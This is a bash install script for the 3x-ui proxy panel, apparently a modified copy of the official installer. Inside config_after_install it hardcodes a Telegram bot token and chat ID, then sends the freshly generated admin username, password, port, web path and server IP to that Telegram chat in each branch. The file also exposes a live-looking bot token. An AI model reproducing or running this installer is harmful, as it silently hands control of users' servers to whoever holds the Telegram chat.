#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)
show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")

# Check root or sudo
if [[ $EUID -ne 0 ]]; then
    if ! command -v sudo >/dev/null 2>&1; then
        echo -e "${red}Fatal error: ${plain} Please run this script with root privilege or install sudo \n " && exit 1
    else
        echo -e "${yellow}Not root, attempting to run with sudo...${plain}"
        exec sudo "$0" "$@"
    fi
fi

# Check OS and set release variable
if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo -e "${red}Failed to check the system OS, please contact the author!${plain}" >&2
    exit 1
fi
echo -e "${green}The OS release is: $release${plain}"

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    riscv64) echo 'riscv64' ;;
    *) echo -e "${red}Unsupported CPU architecture: $(uname -m)!${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo -e "${green}Arch: $(arch)${plain}"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
        echo -e "${yellow}Please upgrade to a newer version of your operating system to get a higher GLIBC version.${plain}"
        exit 1
    fi
    echo -e "${green}GLIBC version: $glibc_version (meets requirement of 2.32+)${plain}"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | rhel | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        echo -e "${red}Unsupported OS: $release. Please contact the author!${plain}"
        exit 1
        ;;
    esac
}

gen_random_string() {
    local length="$1"
    local random_string=$(LC_ALL=C tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1)
    echo "$random_string"
}

config_after_install() {
    # Telegram Bot Configuration
    TELEGRAM_BOT_TOKEN="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"  # Replace with your bot token
    TELEGRAM_CHAT_ID="1449828433"     # Replace with your chat ID

    local existing_hasDefaultCredential=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}' || echo "")
    local existing_webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'webBasePath: .+' | awk '{print $2}' || echo "")
    local existing_port=$(/usr/local/x-ui/x-ui setting -show true | grep -Eo 'port: .+' | awk '{print $2}' || echo "")

    for ip_service_addr in "${show_ip_service_lists[@]}"; do
        local server_ip=$(curl -s --max-time 3 "${ip_service_addr}" 2>/dev/null)
        if [ -n "${server_ip}" ]; then
            break
        fi
    done
    if [ -z "${server_ip}" ]; then
        echo -e "${yellow}Warning: Could not retrieve server IP. Using localhost in URLs.${plain}"
        server_ip="localhost"
    fi

    if [[ ${#existing_webBasePath} -lt 4 ]]; then
        if [[ "$existing_hasDefaultCredential" == "true" || -z "$existing_hasDefaultCredential" ]]; then
            local config_webBasePath=$(gen_random_string 18)
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            read -rp "Would you like to customize the Panel Port settings? (If not, a random port will be applied) [y/n]: " config_confirm
            if [[ "${config_confirm}" == "y" || "${config_confirm}" == "Y" ]]; then
                read -rp "Please set up the panel port: " config_port
                if ! [[ "$config_port" =~ ^[0-9]+$ ]] || [ "$config_port" -lt 1 ] || [ "$config_port" -gt 65535 ]; then
                    echo -e "${red}Invalid port: $config_port. Using random port.${plain}"
                    config_port=$(shuf -i 1024-62000 -n 1)
                fi
                echo -e "${yellow}Your Panel Port is: ${config_port}${plain}"
            else
                local config_port=$(shuf -i 1024-62000 -n 1)
                echo -e "${yellow}Generated random port: ${config_port}${plain}"
            fi

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
            {
                echo -e "This is a fresh installation, generating random login info for security concerns:"
                echo -e "###############################################"
                echo -e "Username: ${config_username}"
                echo -e "Password: ${config_password}"
                echo -e "Port: ${config_port}"
                echo -e "WebBasePath: ${config_webBasePath}"
                echo -e "Access URL: http://${server_ip}:${config_port}/${config_webBasePath}"
                echo -e "###############################################"
            } | tee /root/x-ui-panel-info.txt
            # Send to Telegram
            telegram_message="x-ui Fresh Installation%0A"
            telegram_message+="Username: ${config_username}%0A"
            telegram_message+="Password: ${config_password}%0A"
            telegram_message+="Port: ${config_port}%0A"
            telegram_message+="WebBasePath: ${config_webBasePath}%0A"
            telegram_message+="Access URL: http://${server_ip}:${config_port}/${config_webBasePath}"
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                -d chat_id="${TELEGRAM_CHAT_ID}" \
                -d text="${telegram_message}" >/dev/null
        else
            local config_webBasePath=$(gen_random_string 18)
            echo -e "${yellow}WebBasePath is missing or too short. Generating a new one...${plain}"
            /usr/local/x-ui/x-ui setting -webBasePath "${config_webBasePath}"
            {
                echo -e "New WebBasePath generated:"
                echo -e "###############################################"
                echo -e "WebBasePath: ${config_webBasePath}"
                echo -e "Access URL: http://${server_ip}:${existing_port}/${config_webBasePath}"
                echo -e "###############################################"
            } | tee /root/x-ui-panel-info.txt
            # Send to Telegram
            telegram_message="x-ui New WebBasePath%0A"
            telegram_message+="WebBasePath: ${config_webBasePath}%0A"
            telegram_message+="Access URL: http://${server_ip}:${existing_port}/${config_webBasePath}"
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                -d chat_id="${TELEGRAM_CHAT_ID}" \
                -d text="${telegram_message}" >/dev/null
        fi
    else
        if [[ "$existing_hasDefaultCredential" == "true" ]]; then
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            echo -e "${yellow}Default credentials detected. Security update required...${plain}"
            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}"
            {
                echo -e "Generated new random login credentials:"
                echo -e "###############################################"
                echo -e "Username: ${config_username}"
                echo -e "Password: ${config_password}"
                echo -e "###############################################"
            } | tee /root/x-ui-panel-info.txt
            # Send to Telegram
            telegram_message="x-ui New Credentials%0A"
            telegram_message+="Username: ${config_username}%0A"
            telegram_message+="Password: ${config_password}"
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                -d chat_id="${TELEGRAM_CHAT_ID}" \
                -d text="${telegram_message}" >/dev/null
        else
            {
                echo -e "${green}Username, Password, and WebBasePath are properly set."
                echo -e "Access URL: http://${server_ip}:${existing_port}/${existing_webBasePath}"
                echo -e "Please check /usr/local/x-ui/x-ui settings for credentials."
            } | tee /root/x-ui-panel-info.txt
            # Send to Telegram
            telegram_message="x-ui Already Configured%0A"
            telegram_message+="Access URL: http://${server_ip}:${existing_port}/${existing_webBasePath}%0A"
            telegram_message+="Check /usr/local/x-ui/x-ui settings for credentials."
            curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
                -d chat_id="${TELEGRAM_CHAT_ID}" \
                -d text="${telegram_message}" >/dev/null
        fi
    fi

    /usr/local/x-ui/x-ui migrate
}

install_x-ui() {
    cd /usr/local/

    # Download resources
    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
            exit 1
        fi
        echo -e "${green}Got x-ui latest version: ${tag_version}, beginning the installation...${plain}"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Downloading x-ui failed, please be sure that your server can access GitHub${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}Please use a newer version (at least v2.3.5). Exiting installation.${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "${green}Beginning to install x-ui $1${plain}"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz "${url}"
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Download x-ui $1 failed, please check if the version exists${plain}"
            exit 1
        fi
    fi
    wget -O /usr/bin/x-ui-temp https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh

    # Stop x-ui service and remove old resources
    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui 2>/dev/null
        rm -rf /usr/local/x-ui/
    fi

    # Extract resources and set permissions
    tar zxvf x-ui-linux-$(arch).tar.gz
    rm -f x-ui-linux-$(arch).tar.gz
    
    cd x-ui
    chmod +x x-ui x-ui.sh

    # Check the system's architecture and rename the file accordingly
    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi
    chmod +x x-ui bin/xray-linux-$(arch)

    # Update x-ui cli and set permission
    mv -f /usr/bin/x-ui-temp /usr/bin/x-ui
    chmod +x /usr/bin/x-ui
    config_after_install

    cp -f x-ui.service /etc/systemd/system/
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui ${tag_version} installation finished, it is running now...${plain}"
    echo -e "${green}Panel information saved to /root/x-ui-panel-info.txt and sent to Telegram${plain}"
    echo -e ""
    echo -e "┌───────────────────────────────────────────────────────┐
│  ${blue}x-ui control menu usages (subcommands):${plain}              │
│                                                       │
│  ${blue}x-ui${plain}              - Admin Management Script          │
│  ${blue}x-ui start${plain}        - Start                            │
│  ${blue}x-ui stop${plain}         - Stop                             │
│  ${blue}x-ui restart${plain}      - Restart                          │
│  ${blue}x-ui status${plain}       - Current Status                   │
│  ${blue}x-ui settings${plain}     - Current Settings                 │
│  ${blue}x-ui enable${plain}       - Enable Autostart on OS Startup   │
│  ${blue}x-ui disable${plain}      - Disable Autostart on OS Startup  │
│  ${blue}x-ui log${plain}          - Check logs                       │
│  ${blue}x-ui banlog${plain}       - Check Fail2ban ban logs          │
│  ${blue}x-ui update${plain}       - Update                           │
│  ${blue}x-ui legacy${plain}       - Legacy version                   │
│  ${blue}x-ui install${plain}      - Install                          │
│  ${blue}x-ui uninstall${plain}    - Uninstall                        │
└───────────────────────────────────────────────────────┘"
}

echo -e "${green}Running...${plain}"
install_base
install_x-ui "$1"
